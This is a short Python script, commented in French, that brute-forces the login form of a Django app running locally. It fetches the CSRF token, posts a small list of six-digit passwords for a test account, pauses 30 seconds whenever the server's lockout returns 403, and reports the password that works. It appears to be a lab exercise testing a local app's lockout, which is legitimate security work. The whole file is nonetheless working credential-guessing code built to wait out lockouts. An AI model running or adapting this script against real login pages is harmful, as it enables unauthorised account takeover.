import requests
import time
from bs4 import BeautifulSoup
# URL de ta page de connexion Django
url = 'http://127.0.0.1:8000/'  




username = 'test@example.com'  
resultats = ['111111','000354','444333','999999','123456','654321']
# Créer une session
session = requests.Session()

# Récupérer le CSRF token et le cookie
response = session.get(url)
soup = BeautifulSoup(response.content, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'}).get('value')
print(f"CSRF Token récupéré : {csrf_token}")


def try_password(password):
    data = {
        'username': username,
        'password': password , # Mot de passe généré
        'csrfmiddlewaretoken': csrf_token, 
    }
    headers = {
        'X-CSRFToken': csrf_token,
    }
    # Envoyer la requête POST au serveur
    response = session.post(url, data=data, headers=headers)
    if response.status_code == 403:
            print("le compte A ete blocker wait 30 seconde pour la prochaine attaque")
            time.sleep(30)  # Attente de 30 secondes 
            return False  # Retourne False pour indiquer l'échec de la tentative
    #response = requests.post(url, data=data, headers=headers)
    if "Login successful!" in response.text:
        print(f"Connexion réussie avec : {username} / {password}")
        return True
    else:
        return False


def brute_force_attack():
    start_time = time.time()  # Commencer le chronomètr
    for password in resultats:
            print(f"Essai avec le mot de passe: {password}")

            # Tester le mot de passe
            if try_password(password):
                end_time = time.time()  # Arrêter le chronomètre
                print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
                return password  # Retourner le mot de passe trouvé et arrêter
    end_time = time.time()  # Arrêter le chronomètre
    print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
# Lancer l'attaque par force brute
found_password = brute_force_attack()

if found_password:
    print(f"Le mot de passe correct est: {found_password}")
else:
    print("Aucun mot de passe trouvé.")
